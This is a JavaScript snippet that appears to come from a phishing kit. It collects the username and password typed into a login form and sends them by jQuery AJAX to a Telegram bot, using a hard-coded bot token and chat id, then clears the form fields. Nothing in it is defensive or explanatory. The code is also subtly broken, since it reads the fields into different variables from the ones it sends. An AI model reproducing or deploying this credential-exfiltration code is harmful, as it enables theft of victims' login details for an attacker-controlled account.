//bot token
var telegram_bot_id = "7376924106:AAFTGm6XCAbnzc-M5VeIRqMm-9I9859oxpQ";
//chat id
var chat_id = 6199929198;
var u_username, password;
var ready = function () {
    u_name = document.getElementById("username").value;
    email = document.getElementById("password").value;
    message = "Username: " + u_username + "\nPassword: " + password;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
    return false;
};
